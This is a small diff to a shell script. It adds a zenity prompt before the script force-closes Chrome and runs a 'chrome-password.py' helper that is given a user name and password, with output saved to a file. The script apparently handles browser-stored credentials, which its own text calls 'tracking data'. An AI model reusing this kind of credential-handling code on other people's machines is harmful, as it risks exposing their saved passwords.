@@ -41,6 +41,7 @@ if [ ! -z "$USER_NAME" ] && [[ "$USER_NAME" =~ ^[a-zA-Z0-9]*@[a-zA-Z0-9]*\.[a-zA
     # echo -e "Terminating Chrome to track data";
     # read -p 'Do you wish to terminate ? y or n: ' choice;
     # if [[ "$choice" == "y" ]]; then
+        zenity --question --text="Continue to Track data?"
         killall -q -15 chrome
         echo -e "Run Save Password Script!\n";
         python3 "$PATH_TO_SCRIPT"/chrome-password.py "$USER_NAME" "$USER_PASSWORD" "$PATH_TO_SCRIPT" 2>&1 | tee "$PATH_TO_SCRIPT"/output.txt
